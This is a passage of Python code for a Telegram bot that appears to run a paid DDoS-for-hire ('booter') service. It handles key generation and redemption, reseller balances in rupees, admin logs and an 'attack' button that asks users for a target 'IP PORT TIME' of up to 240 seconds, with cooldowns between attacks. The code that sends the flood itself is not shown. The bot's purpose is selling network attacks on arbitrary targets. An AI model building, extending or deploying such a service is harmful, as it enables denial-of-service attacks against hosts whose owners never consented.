                        InlineKeyboardButton("🔐 *Generate Key* 🗝️", callback_data="generate_key")])
    if role == "Admin":
        keyboard.append([InlineKeyboardButton("🔐 *Generate Admin Key* 👑", callback_data="admin_key"),
                        InlineKeyboardButton("📜 *View Logs* 📝", callback_data="logs")])
        keyboard.append([InlineKeyboardButton("👥 *Manage Resellers* 💼", callback_data="manage_resellers"),
                        InlineKeyboardButton("👤 *List Users* 🙋", callback_data="list_users")])
        if user_id == "1807014348":  # Only for @sadiq9869
            keyboard.append([InlineKeyboardButton("📝 *View Feedback* 🌟", callback_data="view_feedback")])
    keyboard.append([InlineKeyboardButton("📖 *Help* ❓", callback_data="help"),
                    InlineKeyboardButton("🏠 *Home* 🏡", callback_data="home")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode="Markdown")
    await simulate_progress(update.message.chat_id, context, msg)

async def view_feedback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /viewfeedback command with enhanced neon UI (only for @sadiq9869)"""
    user_id = str(update.effective_user.id)
    if maintenance_mode:
        await update.message.reply_text(
            "🛠 *Neon Cyber Maintenance Mode!* 😎\nHold tight, we’re fixing things fast! 🚀",
            parse_mode="Markdown"
        )
        return
    if is_banned(user_id):
        await update.message.reply_text("🚫 *Banned!* 😡 You can’t use this bot! 🌌")
        return
    if not check_rate_limit(user_id, context):
        await update.message.reply_text("⏳ *Chill, Bro!* 😎 Too many commands, wait a minute. 🌌")
        return
    if check_session_timeout(user_id):
        await update.message.reply_text("🔄 *Session Expired!* 😕 Run /start again. 🌌")
        return
    if user_id != "1807014348":
        await update.message.reply_text("🔒 *Access Denied!* 😕 This command is only for @sadiq9869. 🌌")
        return
    sessions[user_id]["state"] = "view_feedback"
    sessions[user_id]["feedback_page"] = 0
    await show_feedback_page(user_id, context)

async def show_feedback_page(user_id, context, page=0):
    """Show paginated feedback list with enhanced neon UI"""
    user_id = str(user_id)
    feedbacks_per_page = 5
    feedback_list = [
        {"id": k, **v} for k, v in feedbacks.items()
    ]
    total_pages = (len(feedback_list) + feedbacks_per_page - 1) // feedbacks_per_page
    start = page * feedbacks_per_page
    end = start + feedbacks_per_page
    page_feedbacks = feedback_list[start:end]
    if not page_feedbacks:
        await context.bot.send_message(
            chat_id=user_id,
            text="📝 *No Feedback Available!* 😔 🌌",
            parse_mode="Markdown"
        )
        return
    feedback_text = f"📝 *Neon Cyber Feedback List (Page {page + 1}/{total_pages})* 📋 🌌\n\n"
    for fb in page_feedbacks:
        feedback_text += (
            f"🆔 *Feedback ID*: {fb['id']}\n"
            f"🙋 *User*: {fb['user_id']}\n"
            f"📅 *Time*: {fb['timestamp']}\n"
            f"📜 *Message*: {fb['message']}\n"
            f"🎯 *Action*: {fb['action']}\n"
            f"{'─' * 30}\n"
        )
    keyboard = []
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"feedback_page_{page-1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"feedback_page_{page+1}"))
    if nav_buttons:
        keyboard.append(nav_buttons)
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back"),
                    InlineKeyboardButton("🏠 Home", callback_data="home")])
    await context.bot.send_message(
        chat_id=user_id,
        text=feedback_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def list_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /listkeys command with enhanced neon UI"""
    user_id = str(update.effective_user.id)
    if maintenance_mode:
        await update.message.reply_text(
            "🛠 *Neon Cyber Maintenance Mode!* 😎\nHold tight, we’re fixing things fast! 🚀",
            parse_mode="Markdown"
        )
        return
    if is_banned(user_id):
        await update.message.reply_text("🚫 *Banned!* 😡 You can’t use this bot! 🌌")
        return
    if not check_rate_limit(user_id, context):
        await update.message.reply_text("⏳ *Chill, Bro!* 😎 Too many commands, wait a minute. 🌌")
        return
    if check_session_timeout(user_id):
        await update.message.reply_text("🔄 *Session Expired!* 😕 Run /start again. 🌌")
        return
    if get_user_role(user_id) != "Admin":
        await update.message.reply_text("🔒 *Access Denied!* 😕 This command is only for Admins. 🌌")
        return
    sessions[user_id]["state"] = "list_keys"
    sessions[user_id]["key_page"] = 0
    sessions[user_id]["key_filter"] = "all"
    await show_key_page(user_id, context)

async def show_key_page(user_id, context, page=0, filter_type="all"):
    """Show paginated key list with enhanced neon UI and filters"""
    user_id = str(user_id)
    keys_per_page = 5
    key_list = [
        {
            "key": k,
            **v,
            "creator": v.get("creator", "Unknown"),
            "created_at": v.get("created_at", "N/A"),
            "user": v.get("user", "Unused")
        } for k, v in keys.items()
    ]
    if filter_type == "unused":
        key_list = [k for k in key_list if k["user"] == "Unused"]
    elif filter_type == "active":
        key_list = [k for k in key_list if k["user"] != "Unused"]
    total_pages = (len(key_list) + keys_per_page - 1) // keys_per_page
    start = page * keys_per_page
    end = start + keys_per_page
    page_keys = key_list[start:end]
    if not page_keys:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"🔐 *No Keys in This Filter* 😔\nFilter: *{filter_type.capitalize()}* 🌌",
            parse_mode="Markdown"
        )
        return
    key_text = f"🔐 *Neon Cyber Keys List (Page {page + 1}/{total_pages})* 📋 🌌\nFilter: *{filter_type.capitalize()}*\n\n"
    for key_info in page_keys:
        key_text += (
            f"🔑 *Key*: `{key_info['key']}`\n"
            f"⏰ *Duration*: {key_info['duration']}\n"
            f"👤 *Creator*: {key_info['creator']}\n"
            f"📅 *Created*: {key_info['created_at']}\n"
            f"🙋 *User*: {key_info['user']}\n"
            f"⏳ *Expires*: {key_info.get('expiration_time', 'N/A')}\n"
            f"{'─' * 30}\n"
        )
    keyboard = [
        [InlineKeyboardButton("📌 All Keys", callback_data="filter_all"),
         InlineKeyboardButton("🚫 Unused Keys", callback_data="filter_unused"),
         InlineKeyboardButton("✅ Active Keys", callback_data="filter_active")],
    ]
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"key_page_{page-1}_{filter_type}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"key_page_{page+1}_{filter_type}"))
    if nav_buttons:
        keyboard.append(nav_buttons)
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back"),
                    InlineKeyboardButton("🏠 Home", callback_data="home")])
    await context.bot.send_message(
        chat_id=user_id,
        text=key_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button clicks with enhanced neon UI"""
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)
    if maintenance_mode:
        await query.message.reply_text(
            "🛠 *Neon Cyber Maintenance Mode!* 😎\nHold tight, we’re fixing things fast! 🚀",
            parse_mode="Markdown"
        )
        return
    if is_banned(user_id):
        await query.message.reply_text("🚫 *Banned!* 😡 You can’t use this bot! 🌌")
        return
    if not check_rate_limit(user_id, context):
        await query.message.reply_text("⏳ *Chill, Bro!* 😎 Too many commands, wait a minute. 🌌")
        return
    if check_session_timeout(user_id):
        Sistart = datetime.datetime.now()
        await query.message.reply_text("🔄 *Session Expired!* 😕 Run /start again. 🌌")
        return
    sessions[user_id]["last_active"] = time.time()
    action = query.data
    analyze_user_behavior(user_id, action)
    if action == "attack":
        if user_id in users and datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
            await query.message.reply_text("⏰ *Access Expired!* 😔 Contact @Rahul_618 or @sadiq9869. 🌌")
            return
        if user_id in last_attack_time and (datetime.datetime.now() - last_attack_time[user_id]).total_seconds() < COOLDOWN_PERIOD:
            remaining = int(COOLDOWN_PERIOD - (datetime.datetime.now() - last_attack_time[user_id]).total_seconds())
            await query.message.reply_text(f"⏳ *Neon Cyber Cooldown!* 😴 Wait {remaining} seconds. 🌌")
            return
        if global_attack_active or user_id in attacks:
            await query.message.reply_text("🚧 *Attack Already Running!* ⏳ Wait a bit. 🌌")
            return
        sessions[user_id]["state"] = "attack_input"
        msg = await query.message.reply_text(
            "🔥 *Launch Neon Cyber Attack* 🚀 🌌\nFormat: `IP PORT TIME`\nExample: `127.0.0.1 8000 60`\nMax Duration: 240s\nEnter details or say 'back' to cancel.",
            parse_mode="Markdown"
        )
        await simulate_progress(query.message.chat_id, context, msg)
    elif action == "profile":
        role = get_user_role(user_id)
        if role == "Admin":
            info = (
                f"👤 *Your Neon Cyber Profile* 🌟\n"
                f"📛 *Username*: {admin_id[user_id]['username']}\n"
                f"🆔 *ID*: {user_id}\n"
                f"🔑 *Role*: Admin 👑\n"
                f"😎 *Nickname*: {admin_id[user_id]['nickname']}\n"
                f"⏰ *Expiration*: N/A\n"
                f"🕒 *Last Active*: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        elif role == "Reseller":
            info = (
                f"👤 *Your Neon Cyber Profile* 🌟\n"
                f"🆔 *ID*: {user_id}\n"
                f"🔑 *Role*: Reseller 💼\n"
                f"💰 *Balance*: {resellers[user_id]} Rs\n"
                f"⏰ *Expiration*: N/A\n"
                f"🕒 *Last Active*: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        elif role == "User":
            info = (
                f"👤 *Your Neon Cyber Profile* 🌟\n"
                f"🆔 *ID*: {user_id}\n"
                f"🔑 *Role*: User 🙋\n"
                f"⏰ *Expiration*: {users[user_id]}\n"
                f"🕒 *Last Active*: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        msg = await query.message.reply_text(info, parse_mode="Markdown")
        await simulate_progress(query.message.chat_id, context, msg)
    elif action == "redeem":
        sessions[user_id]["state"] = "redeem_key"
        msg = await query.message.reply_text(
            "🔑 *Redeem Neon Cyber Key* 🗝️ 🌌\nEnter a valid key (e.g., `ROHAN-PK-ABCD1234`) or say 'back' to cancel.",
            parse_mode="Markdown"
        )
        await simulate_progress(query.message.chat_id, context, msg)
    elif action == "status":
        uptime = datetime.datetime.now() - bot_start_time
        days, seconds = uptime.days, uptime.seconds
        hours, minutes = seconds // 3600, (seconds % 3600) // 60
        feedback_count = len(feedbacks)
        issues = analyze_feedback()
        issue_summary = "\n".join(issues) if issues else "✅ No major issues!"
        recent_maintenance = maintenance_history[-3:] if maintenance_history else [{"event": "None", "details": "No maintenance yet"}]
        maintenance_summary = "\n".join([f"🛠 {m['event']}: {m['details']} ({m['timestamp']})" for m in recent_maintenance])
        behavior_stats = user_behavior.get(user_id, {'skips': 0, 'commands': {}, 'normal_text': 0})
        top_keywords = sorted(normal_text_stats['keywords'].items(), key=lambda x: x[1], reverse=True)[:3]
        keyword_summary = ", ".join([f"{k}: {v}" for k, v in top_keywords]) if top_keywords else "None"
        status_text = (
            f"📊 *Neon Cyber System Status Dashboard* 📈 🌌\n"
            f"⏱ *Uptime*: {days}d {hours}h {minutes}m {'█' * min(days, 10)}\n"
            f"👥 *Users*: {len(users)} {'█' * min(len(users) // 10, 10)}\n"
            f"🔐 *Keys*: {len(keys)} {'█' * min(len(keys) // 10, 10)}\n"
            f"💸 *Resellers*: {len(resellers)} {'█' * min(len(resellers) // 2, 10)}\n"
            f"🔥 *Active Attacks*: {len(attacks)} {'█' * min(len(attacks), 10)}\n"
            f"📝 *Feedbacks*: {feedback_count} {'█' * min(feedback_count // 5, 10)}\n"
            f"💬 *Normal Text Messages*: {normal_text_stats['total']} {'█' * min(normal_text_stats['total'] // 10, 10)}\n"
            f"🔑 *Top Keywords*: {keyword_summary}\n"
            f"⚠️ *Recent Issues*: {issue_summary}\n"
            f"🛠 *Maintenance History*:\n{maintenance_summary}\n"
            f"🤖 *Your Stats*:\n- Feedback Skips: {behavior_stats['skips']}\n- Commands Used: {len(behavior_stats['commands'])}\n- Normal Texts: {behavior_stats['normal_text']}\n"
            f"🕒 *Last Active*: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"💾 *Data Folder*: {current_data_dir}"
        )
        if user_id in admin_id:
            status_text += f"\n👑 *Admin*: {admin_id[user_id]['nickname']}"
        msg = await query.message.reply_text(status_text, parse_mode="Markdown")
        await simulate_progress(query.message.chat_id, context, msg)
    elif action == "balance" and get_user_role(user_id) == "Reseller":
        msg = await query.message.reply_text(
            f"💰 *Your Neon Cyber Balance* 💸 🌌\n*Amount*: {resellers[user_id]} Rs\n*Last Active*: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="Markdown"
        )
        await simulate_progress(query.message.chat_id, context, msg)
    elif action == "generate_key" and get_user_role(user_id) == "Reseller":
        sessions[user_id]["state"] = "generate_key"
        msg = await query.message.reply_text(
            "🔐 *Generate Neon Cyber Key* 🗝️ 🌌\nEnter duration (e.g., `5 hours`, `10 days`, `2 months`) or say 'back' to cancel.",
            parse_mode="Markdown"
        )
        await simulate_progress(query.message.chat_id, context, msg)
    elif action == "admin_key" and get_user_role(user_id) == "Admin":
        sessions[user_id]["state"] = "admin_key"
        msg = await query.message.reply_text(
            "🔐 *Generate Neon Cyber Admin Key* 👑 🌌\nEnter duration (e.g., `5 hours`, `10 days`, `2 months`) or say 'back' to cancel.",
            parse_mode="Markdown"
        )
        await simulate_progress(query.message.chat_id, context, msg)
    elif action == "logs" and get_user_role(user_id) == "Admin":
        if not os.path.exists(FILES['logs']) or os.stat(FILES['logs']).st_size == 0:
            await query.message.reply_text("📜 *No Logs Available!* 😔 🌌")
            return
        try:
            set_file_permissions(FILES['logs'], read_only=False)
            with open(FILES['logs'], "r") as file:
                logs = file.readlines()[-10:]
            set_file_permissions(FILES['logs'], read_only=True)
            log_text = "".join(logs)
            msg = await query.message.reply_text(
                f"📜 *Neon Cyber Recent Logs* 📋 🌌\n```\n{log_text}\n```",
                parse_mode="Markdown"
            )
            await simulate_progress(query.message.chat_id, context, msg)
        except Exception as e:
            logger.error(f"Log view error: {e}")
            await query.message.reply_text("❌ *Error Viewing Logs!* 😔 Try again or contact @Rahul_618. 🌌")
    elif action == "manage_resellers" and get_user_role(user_id) == "Admin":
        keyboard = [
            [InlineKeyboardButton("➕ Add Reseller 🌟", callback_data="add_reseller"),
             InlineKeyboardButton("📋 List Resellers 📋", callback_data="list_resellers")],
            [InlineKeyboardButton("💰 Add Balance 💸", callback_data="add_balance"),
             InlineKeyboardButton("➖ Remove Reseller 🚫", callback_data="remove_reseller")],
            [InlineKeyboardButton("🔙 Back", callback_data="back"),
             InlineKeyboardButton("🏠 Home", callback_data="home")]
        ]
        msg = await query.message.reply_text(
            "👥 *Manage Neon Cyber Resellers* 💼 🌌\nChoose an option, bro:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
        await simulate_progress(query.message.chat_id, context, msg)
    elif action == "list_users" and get_user_role(user_id) == "Admin":
        if not users:
            await query.message.reply_text("👤 *No Authorized Users!* 😔 🌌")
            return
        user_list = [f"🆔 {uid} | ⏰ {exp}" for uid, exp in users.items()][:10]
        msg = await query.message.reply_text(
            f"👤 *Neon Cyber Authorized Users* 🙋 🌌\n" + "\n".join(user_list),
            parse_mode="Markdown"
        )
        await simulate_progress(query.message.chat_id, context, msg)
    elif action == "list_keys" and get_user_role(user_id) == "Admin":
        sessions[user_id]["state"] = "list_keys"
        sessions[user_id]["key_page"] = 0
        sessions[user_id]["key_filter"] = "all"
        await show_key_page(user_id, context)
    elif action.startswith("key_page_") and get_user_role(user_id) == "Admin":
        parts = action.split("_")
        page = int(parts[2])
        filter_type = parts[3]
        sessions[user_id]["key_page"] = page
        sessions[user_id]["key_filter"] = filter_type
        await show_key_page(user_id, context, page, filter_type)
    elif action.startswith("filter_") and get_user_role(user_id) == "Admin":
        filter_type = action.split("_")[1]
        sessions[user_id]["key_page"] = 0
        sessions[user_id]["key_filter"] = filter_type
        await show_key_page(user_id, context, 0, filter_type)
    elif action == "view_feedback" and user_id == "1807014348":
        sessions[user_id]["state"] = "view_feedback"
        sessions[user_id]["feedback_page"] = 0
        await show_feedback_page(user_id, context)
    elif action.startswith("feedback_page_") and user_id == "1807014348":
        page = int(action.split("_")[2])
        sessions[user_id]["feedback_page"] = page
        await show_feedback_page(user_id, context, page)
    elif action == "feedback_submit":
        sessions[user_id]["state"] = "feedback_input"
        msg = await query.message.reply_text(
            f"📝 *Give Neon Cyber Feedback, Bro!* 🌟\nShare your feedback (bugs, suggestions, anything) or say 'back' to cancel.",
            parse_mode="Markdown"
        )
        await simulate_progress(query.message.chat_id, context, msg)
    elif action == "feedback_skip":
        sessions[user_id]["state"] = None
        sessions[user_id]["feedback_action"] = None
        analyze_user_behavior(user_id, sessions[user_id]["feedback_action"], skipped=True)
        msg = await query.message.reply_text(
            "⏭ *Alright, Skipped!* 😎 No worries, I’ll figure it out! Hit me up anytime for feedback! 🌌",
            parse_mode="Markdown"
        )
        await simulate_progress(query.message.chat_id, context, msg)

async def main():
    """Main function to run the bot"""
    global application
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("viewfeedback", view_feedback))
    application.add_handler(CommandHandler("listkeys", list_keys))
    application.add_handler(CallbackQueryHandler(button_callback))
    load_data()
    # Start background tasks
    asyncio.create_task(cleanup_sessions(application))
    asyncio.create_task(run_self_diagnostic(application))
    await application.run_polling()

if __name__ == "__main__":
    asyncio.run(main())